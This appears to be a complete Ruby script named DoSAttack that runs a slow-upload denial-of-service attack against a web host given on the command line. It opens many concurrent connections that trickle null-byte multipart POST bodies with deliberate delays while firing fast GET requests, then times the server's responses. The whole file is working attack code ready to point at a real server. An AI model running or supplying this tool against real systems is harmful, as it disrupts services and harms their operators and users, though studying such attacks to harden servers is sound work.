#!/usr/bin/env ruby

if ARGV.empty?
  puts "Usage: #{$PROGRAM_NAME} HOST"
  puts "  e.g. #{$PROGRAM_NAME} example.com"
  exit(1)
end

require 'celluloid/io'

class DoSAttack
  include Celluloid::IO
  finalizer :finalize

  NEWLINE = "\r\n"
  PAYLOAD = "\0" * 8192

  def initialize host, times=50, size=1024*1024
    @host    = host
    @times   = times.to_i
    @size    = size .to_i

    @socks   = {}
    @payload =
"--b#{NEWLINE}"                                                              \
"Content-Disposition: form-data; name=\"f\"; filename=\"payload\"#{NEWLINE}" \
"#{NEWLINE}"

    @length  = @payload.bytesize + @size + 7
    @header  =
"POST / HTTP/1.1#{NEWLINE}"                                                  \
"Host: #{@host}#{NEWLINE}"                                                   \
"Content-Length: #{@length}#{NEWLINE}"                                       \
"Content-type: multipart/form-data; boundary=b#{NEWLINE}"                    \
"#{NEWLINE}"
  end

  def run
    @times.times do
      async.slow_upload
      async.fast_request
    end
  end

  private
  def finalize
    @socks.each_value(&:close)
  end

  def slow_upload
    request do |sock|
      sock.write(@header)
      sock.write(@payload)
      (@size / 8192).times do
        sock.write(PAYLOAD)
        sleep 0.1
      end
      sock.write("\0" * (@size % 8192))
      sock.write("#{NEWLINE}--b--")

      " Slow Upload: "
    end
  end

  def fast_request
    request do |sock|
      sock.write("GET / HTTP/1.1#{NEWLINE}HOST: #{@host}#{NEWLINE}#{NEWLINE}")

      "Fast Request: "
    end
  end

  def request
    now  = Time.now
    port = (@host[/:(\d+)/, 1] || 80).to_i
    sock = TCPSocket.new(@host.sub(/:.+/, ''), port)
    @socks[sock.object_id] = sock
    msg = yield(sock)
    res = sock.readpartial(4096)
    printf "#{msg}Server: %9f  Client: %9f\n",
           res[/\r\n\r\n(.*)/, 1].to_f, (Time.now - now).to_f
  ensure
    cleanup(sock)
  end

  def cleanup sock
    begin
      sock.close
    rescue EOFError
    end
    @socks.delete(sock.object_id)
    if @socks.empty?
      terminate
      Thread.main.wakeup
    end
  end
end

attack = DoSAttack.new(*ARGV)
attack.run
trap('INT'){ attack.terminate; Thread.main.wakeup }
sleep
